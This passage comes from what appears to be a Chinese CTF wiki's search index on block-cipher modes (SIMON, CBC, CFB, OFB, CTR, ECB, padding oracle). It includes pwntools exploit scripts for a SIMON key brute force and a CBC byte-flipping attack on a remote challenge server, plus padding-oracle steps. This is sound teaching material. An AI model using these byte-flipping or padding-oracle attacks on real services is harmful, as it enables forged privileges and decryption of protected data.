8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece https://github.com/bozhu/NSA-ciphers/blob/master/simon.py \u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002</p> <p>\u5177\u4f53\u5982\u4e0b</p> <pre><code>from pwn import *\nfrom simon import SIMON\n\nplain = 0x6d564d37426e6e71\ncipher = 0xbb5d12ba422834b5\n\n\ndef compare(key):\n    key = \"SECCON{\" + key + \"}\"\n    key = key.encode('hex')\n    key = int(key, 16)\n    my_simon = SIMON(64, 96, key)\n    test = my_simon.encrypt(plain)\n    if test == cipher:\n        return True\n    else:\n        return False\n\n\ndef solve():\n    visible = string.uppercase + string.lowercase + string.digits + string.punctuation + \" \"\n    key = pwnlib.util.iters.mbruteforce(compare, visible, 4, method=\"fixed\")\n    print key\n\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  2017_seccon_simon_and_speck_block_ciphers git:(master) python exp.py\n[+] MBruteforcing: Found key: \"6Pz0\"\n</code></pre>"},{"location":"crypto/blockcipher/simon-speck/#_2","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://en.wikipedia.org/wiki/Simon_(cipher)</li> </ul>"},{"location":"crypto/blockcipher/mode/cbc/","title":"CBC","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>CBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\uff0c\u8fd9\u91cc</p> <ul> <li>IV \u4e0d\u8981\u6c42\u4fdd\u5bc6</li> <li>IV \u5fc5\u987b\u662f\u4e0d\u53ef\u9884\u6d4b\u7684\uff0c\u800c\u4e14\u8981\u4fdd\u8bc1\u5b8c\u6574\u6027\u3002</li> </ul>"},{"location":"crypto/blockcipher/mode/cbc/#_1","title":"\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/mode/cbc/#_2","title":"\u89e3\u5bc6","text":""},{"location":"crypto/blockcipher/mode/cbc/#_3","title":"\u4f18\u7f3a\u70b9","text":""},{"location":"crypto/blockcipher/mode/cbc/#_4","title":"\u4f18\u70b9","text":"<ol> <li>\u5bc6\u6587\u5757\u4e0d\u4ec5\u548c\u5f53\u524d\u5bc6\u6587\u5757\u76f8\u5173\uff0c\u800c\u4e14\u548c\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u6216 IV \u76f8\u5173\uff0c\u9690\u85cf\u4e86\u660e\u6587\u7684\u7edf\u8ba1\u7279\u6027\u3002</li> <li>\u5177\u6709\u6709\u9650\u7684\u4e24\u6b65\u9519\u8bef\u4f20\u64ad\u7279\u6027\uff0c\u5373\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002</li> <li>\u5177\u6709\u81ea\u540c\u6b65\u7279\u6027\uff0c\u5373\u7b2c k \u5757\u8d77\u5bc6\u6587\u6b63\u786e\uff0c\u5219\u7b2c k+1 \u5757\u5c31\u80fd\u6b63\u5e38\u89e3\u5bc6\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/cbc/#_5","title":"\u7f3a\u70b9","text":"<ol> <li>\u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\uff0c\u89e3\u5bc6\u53ef\u4ee5\u5e76\u884c\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/cbc/#_6","title":"\u5e94\u7528","text":"<p>CBC \u5e94\u7528\u5341\u5206\u5e7f\u6cdb</p> <ul> <li>\u5e38\u89c1\u7684\u6570\u636e\u52a0\u5bc6\u548c TLS \u52a0\u5bc6\u3002</li> <li>\u5b8c\u6574\u6027\u8ba4\u8bc1\u548c\u8eab\u4efd\u8ba4\u8bc1\u3002</li> </ul>"},{"location":"crypto/blockcipher/mode/cbc/#_7","title":"\u653b\u51fb","text":""},{"location":"crypto/blockcipher/mode/cbc/#_8","title":"\u5b57\u8282\u53cd\u8f6c\u653b\u51fb","text":""},{"location":"crypto/blockcipher/mode/cbc/#_9","title":"\u539f\u7406","text":"<p>\u5b57\u8282\u53cd\u8f6c\u7684\u539f\u7406\u5341\u5206\u7b80\u5355\uff0c\u6211\u4eec\u89c2\u5bdf\u89e3\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u7279\u6027:</p> <ul> <li>IV \u5411\u91cf\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4</li> <li>\u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\u53ef\u4ee5\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4</li> </ul> <p>\u5047\u8bbe\u7b2cn\u4e2a\u5bc6\u6587\u5206\u7ec4\u4e3aC_n\uff0c\u89e3\u5bc6\u540e\u7684\u7b2cn\u4e2a\u660e\u6587\u5206\u7ec4\u4e3a\u4e3aP_n\u3002</p> <p>\u7136\u540eP_{n+1}=C_n~\\text{xor}~f(C_{n+1})\u3002</p> <p>\u5176\u4e2df\u51fd\u6570\u4e3a\u56fe\u4e2d\u7684\\text{Block Cipher Decryption}\u3002</p> <p>\u5bf9\u4e8e\u67d0\u4e2a\u4fe1\u606f\u5df2\u77e5\u7684\u539f\u6587\u548c\u5bc6\u6587\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u7b2cn\u4e2a\u5bc6\u6587\u5757C_n\u4e3aC_n~\\text{xor}~P_{n+1}~\\text{xor}~A\u3002\u7136\u540e\u518d\u5bf9\u8fd9\u6761\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u90a3\u4e48\u89e3\u5bc6\u540e\u7684\u7b2cn\u4e2a\u660e\u6587\u5feb\u5c06\u4f1a\u53d8\u6210A\u3002</p>"},{"location":"crypto/blockcipher/mode/cbc/#_10","title":"\u4f8b\u9898","text":"<pre><code>from flag import FLAG\nfrom Crypto.Cipher import AES\nfrom Crypto import Random\nimport base64\n\nBLOCK_SIZE=16\nIV = Random.new().read(BLOCK_SIZE)\npassphrase = Random.new().read(BLOCK_SIZE)\n\npad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\nunpad = lambda s: s[:-ord(s[len(s) - 1:])]\n\nprefix = \"flag=\"+FLAG+\"&amp;userdata=\"\nsuffix = \"&amp;user=guest\"\ndef menu():\n    print \"1. encrypt\"\n    print \"2. decrypt\"\n    return raw_input(\"&gt; \")\n\ndef encrypt():\n    data = raw_input(\"your data: \")\n    plain = prefix+data+suffix\n    aes = AES.new(passphrase, AES.MODE_CBC, IV)\n    print base64.b64encode(aes.encrypt(pad(plain)))\n\n\ndef decrypt():\n    data = raw_input(\"input data: \")\n    aes = AES.new(passphrase, AES.MODE_CBC, IV)\n    plain = unpad(aes.decrypt(base64.b64decode(data)))\n    print 'DEBUG ====&gt; ' + plain\n    if plain[-5:]==\"admin\":\n        print plain\n    else:\n        print \"you are not admin\"\n\ndef main():\n    for _ in range(10):\n        cmd = menu()\n        if cmd==\"1\":\n            encrypt()\n        elif cmd==\"2\":\n            decrypt()\n        else:\n            exit()\n\nif __name__==\"__main__\":\n    main()\n</code></pre> <p>\u53ef\u89c1\u9898\u76ee\u5e0c\u671b\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u89e3\u5bc6\u540e\u6700\u540e\u7684\u5185\u5bb9\u4e3aadmin\u3002\u7a0b\u5e8f\u5c06\u4f1a\u8f93\u51fa\u660e\u6587\u3002\u6240\u4ee5\u9898\u76ee\u6d41\u7a0b\u4e3a\u5148\u968f\u4fbf\u63d0\u4f9b\u4e00\u4e2a\u660e\u6587\uff0c\u7136\u540e\u5c06\u5bc6\u6587\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u6700\u540e\u7684\u5185\u5bb9\u4e3aadmin,\u6211\u4eec\u53ef\u4ee5\u679a\u4e3eflag\u7684\u957f\u5ea6\u6765\u786e\u5b9a\u6211\u4eec\u9700\u8981\u5728\u4ec0\u4e48\u4f4d\u7f6e\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u4ee5\u4e0b\u662fexp.py</p> <pre><code>from pwn import *\nimport base64\n\npad = 16\ndata = 'a' * pad\nfor x in range(10, 100):\n    r = remote('xxx.xxx.xxx.xxx', 10004)\n    #r = process('./chall.sh')\n\n    r.sendlineafter('&gt; ', '1')\n    r.sendlineafter('your data: ', data)\n    cipher = list(base64.b64decode(r.recv()))\n    #print 'cipher ===&gt;', ''.join(cipher)\n\n    BLOCK_SIZE = 16\n    prefix = \"flag=\" + 'a' * x + \"&amp;userdata=\"\n    suffix = \"&amp;user=guest\"\n    plain = prefix + data + suffix\n\n    idx = (22 + x + pad) % BLOCK_SIZE + ((22 + x + pad) / BLOCK_SIZE - 1) * BLOCK_SIZE\n    cipher[idx + 0] = chr(ord(cipher[idx + 0]) ^ ord('g') ^ ord('a'))\n    cipher[idx + 1] = chr(ord(cipher[idx + 1]) ^ ord('u') ^ ord('d'))\n    cipher[idx + 2] = chr(ord(cipher[idx + 2]) ^ ord('e') ^ ord('m'))\n    cipher[idx + 3] = chr(ord(cipher[idx + 3]) ^ ord('s') ^ ord('i'))\n    cipher[idx + 4] = chr(ord(cipher[idx + 4]) ^ ord('t') ^ ord('n'))\n\n    r.sendlineafter('&gt; ', '2')\n    r.sendlineafter('input data: ', base64.b64encode(''.join(cipher)))\n\n    msg = r.recvline()\n    if 'you are not admin' not in msg:\n        print msg\n        break\n    r.close()  \n</code></pre>"},{"location":"crypto/blockcipher/mode/cbc/#padding-oracle-attack","title":"Padding Oracle Attack","text":"<p>\u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002</p>"},{"location":"crypto/blockcipher/mode/cfb/","title":"CFB","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>CFB \u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002</p>"},{"location":"crypto/blockcipher/mode/cfb/#_1","title":"\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/mode/cfb/#_2","title":"\u89e3\u5bc6","text":""},{"location":"crypto/blockcipher/mode/cfb/#_3","title":"\u4f18\u7f3a\u70b9","text":""},{"location":"crypto/blockcipher/mode/cfb/#_4","title":"\u4f18\u70b9","text":"<ul> <li>\u9002\u5e94\u4e8e\u4e0d\u540c\u6570\u636e\u683c\u5f0f\u7684\u8981\u6c42</li> <li>\u6709\u9650\u9519\u8bef\u4f20\u64ad</li> <li>\u81ea\u540c\u6b65</li> </ul>"},{"location":"crypto/blockcipher/mode/cfb/#_5","title":"\u7f3a\u70b9","text":"<ul> <li>\u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\u5316\uff0c\u89e3\u5bc6\u4e0d\u80fd\u5e76\u884c</li> </ul>"},{"location":"crypto/blockcipher/mode/cfb/#_6","title":"\u5e94\u7528\u573a\u666f","text":"<p>\u8be5\u6a21\u5f0f\u9002\u5e94\u4e8e\u6570\u636e\u5e93\u52a0\u5bc6\uff0c\u65e0\u7ebf\u901a\u4fe1\u52a0\u5bc6\u7b49\u5bf9\u6570\u636e\u683c\u5f0f\u6709\u7279\u6b8a\u8981\u6c42\u7684\u52a0\u5bc6\u73af\u5883\u3002</p>"},{"location":"crypto/blockcipher/mode/cfb/#_7","title":"\u9898\u76ee","text":"<ul> <li>HITCONCTF-Quals-2015-Simple-(Crypto-100)</li> </ul>"},{"location":"crypto/blockcipher/mode/ctr/","title":"CTR","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>CTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\uff0c\u8be5\u6a21\u5f0f\u7531 Diffe \u548c Hellman \u8bbe\u8ba1\u3002</p>"},{"location":"crypto/blockcipher/mode/ctr/#_1","title":"\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/mode/ctr/#_2","title":"\u89e3\u5bc6","text":""},{"location":"crypto/blockcipher/mode/ctr/#_3","title":"\u9898\u76ee","text":"<ul> <li>2017 star ctf ssss</li> <li>2017 star ctf ssss2</li> </ul>"},{"location":"crypto/blockcipher/mode/ecb/","title":"ECB","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>ECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002</p>"},{"location":"crypto/blockcipher/mode/ecb/#_1","title":"\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/mode/ecb/#_2","title":"\u89e3\u5bc6","text":""},{"location":"crypto/blockcipher/mode/ecb/#_3","title":"\u4f18\u7f3a\u70b9","text":""},{"location":"crypto/blockcipher/mode/ecb/#_4","title":"\u4f18\u70b9","text":"<ol> <li>\u5b9e\u73b0\u7b80\u5355\u3002</li> <li>\u4e0d\u540c\u660e\u6587\u5206\u7ec4\u7684\u52a0\u5bc6\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\uff0c\u901f\u5ea6\u5f88\u5feb\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/ecb/#_5","title":"\u7f3a\u70b9","text":"<ol> <li>\u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\uff0c\u4e0d\u4f1a\u9690\u85cf\u660e\u6587\u5206\u7ec4\u7684\u7edf\u8ba1\u89c4\u5f8b\u3002\u6b63\u5982\u4e0b\u56fe\u6240\u793a</li> </ol> <p>\u4e3a\u4e86\u89e3\u51b3\u7edf\u4e00\u660e\u6587\u4ea7\u751f\u76f8\u540c\u5bc6\u6587\u7684\u95ee\u9898\uff0c\u63d0\u51fa\u4e86\u5176\u5b83\u7684\u52a0\u5bc6\u6a21\u5f0f\u3002</p>"},{"location":"crypto/blockcipher/mode/ecb/#_6","title":"\u5178\u578b\u5e94\u7528","text":"<ol> <li>\u7528\u4e8e\u968f\u673a\u6570\u7684\u52a0\u5bc6\u4fdd\u62a4\u3002</li> <li>\u7528\u4e8e\u5355\u5206\u7ec4\u660e\u6587\u7684\u52a0\u5bc6\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/ecb/#2016-abctf-aes-mess-75","title":"2016 ABCTF aes-mess-75","text":"<p>\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b</p> <pre><code>We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this?\n\n[HINT] There has to be some way to work backwards, right?\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u662f\u4e00\u4e2a ECB \u52a0\u5bc6\uff0c\u7136\u540e AES \u662f 16 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528\u4e24\u4e2a 16 \u8fdb\u5236\u5b57\u7b26\u8868\u793a\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u6bcf 32 \u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u5206\u7ec4\uff0c\u7136\u540e\u53bb\u5bf9\u5e94\u7684 txt \u6587\u4ef6\u4e2d\u641c\u7d22\u5373\u53ef\u3002</p> <p>\u5bf9\u5e94 flag</p> <pre><code>e220eb994c8fc16388dbd60a969d4953 abctf{looks_like\nf042fc0bce25dbef573cf522636a1ba3 _you_can_break_a\nfafa1a7c21ff824a5824c5dc4a376e75 es}\n</code></pre> <p>\u6700\u540e\u4e00\u4e2a\u663e\u7136\u5728\u52a0\u5bc6\u65f6\u8fdb\u884c\u4e86 padding\u3002</p>"},{"location":"crypto/blockcipher/mode/ecb/#_7","title":"\u9898\u76ee","text":"<ul> <li>2018 PlaidCTF macsh</li> </ul>"},{"location":"crypto/blockcipher/mode/introduction/","title":"\u5206\u7ec4\u6a21\u5f0f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002</p>"},{"location":"crypto/blockcipher/mode/ofb/","title":"OFB","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>OFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\uff0c\u5176\u53cd\u9988\u5185\u5bb9\u662f\u5206\u7ec4\u52a0\u5bc6\u540e\u7684\u5185\u5bb9\u800c\u4e0d\u662f\u5bc6\u6587\u3002</p>"},{"location":"crypto/blockcipher/mode/ofb/#_1","title":"\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/mode/ofb/#_2","title":"\u89e3\u5bc6","text":""},{"location":"crypto/blockcipher/mode/ofb/#_3","title":"\u4f18\u7f3a\u70b9","text":""},{"location":"crypto/blockcipher/mode/ofb/#_4","title":"\u4f18\u70b9","text":"<ol> <li>\u4e0d\u5177\u6709\u9519\u8bef\u4f20\u64ad\u7279\u6027\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/ofb/#_5","title":"\u7f3a\u70b9","text":"<ol> <li>IV \u65e0\u9700\u4fdd\u5bc6\uff0c\u4f46\u662f\u5bf9\u6bcf\u4e2a\u6d88\u606f\u5fc5\u987b\u9009\u62e9\u4e0d\u540c\u7684 IV\u3002</li> <li>\u4e0d\u5177\u6709\u81ea\u540c\u6b65\u80fd\u529b\u3002</li> </ol>"},{"location":"crypto/blockcipher/mode/ofb/#_6","title":"\u9002\u7528\u573a\u666f","text":"<p>\u9002\u7528\u4e8e\u4e00\u4e9b\u660e\u6587\u5197\u4f59\u5ea6\u6bd4\u8f83\u5927\u7684\u573a\u666f\uff0c\u5982\u56fe\u50cf\u52a0\u5bc6\u548c\u8bed\u97f3\u52a0\u5bc6\u3002</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/","title":"Padding Oracle Attack","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_1","title":"\u4ecb\u7ecd","text":"<p>Padding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6</p> <ul> <li>\u52a0\u5bc6\u7b97\u6cd5<ul> <li>\u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP \u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002</li> <li>\u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002</li> </ul> </li> <li>\u653b\u51fb\u8005\u80fd\u529b<ul> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002</li> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002</li> </ul> </li> </ul> <p>Padding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b</p> <ul> <li>\u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002</li> </ul>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_2","title":"\u539f\u7406","text":"<p>Padding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b</p> <ul> <li>\u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002</li> <li>\u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684</p> <ul> <li>\u52a0\u5bc6</li> </ul>  C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV  <ul> <li>\u89e3\u5bc6</li> </ul>  P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV  <p>\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587 <code>F|Y</code> \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a P=D_K(Y)\\oplus F \uff0c\u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282 F_{n} \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b</p> <ol> <li>i=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a\u968f\u673a\u5b57\u8282\u3002</li> <li>\u8bbe\u7f6e F_n=i \\oplus 0x01</li> <li>\u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e P_n \\oplus i \\oplus 0x01 \u5b57\u8282\u90fd\u662f P_n \\oplus i \\oplus 0x01 \u624d\u4e0d\u4f1a\u62a5\u9519\u3002\u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002 \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519\u6982\u7387\u5f88\u5c0f\u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002</li> <li>\u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002</li> </ol> <p>\u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e F_n=P_n\\oplus 0x02 \uff0c\u540c\u65f6\u8bbe\u7f6e F_{n-1}=i \\oplus 0x02 \u53bb\u679a\u4e3e i\u3002</p> <p>\u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002</p> <p>\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#2017-hitcon-secret-server","title":"2017 HITCON Secret Server","text":""},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_3","title":"\u5206\u6790","text":"<p>\u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c</p> <pre><code>def pad(msg):\n    pad_length = 16-len(msg)%16\n    return msg+chr(pad_length)*pad_length\n\ndef unpad(msg):\n    return msg[:-ord(msg[-1])]\n</code></pre> <p>\u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002</p> <p>\u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f</p> <ul> <li><code>send_msg</code> \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684 <code>2jpmLoSsOlQrqyqE</code> \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002</li> <li><code>recv_msg</code> 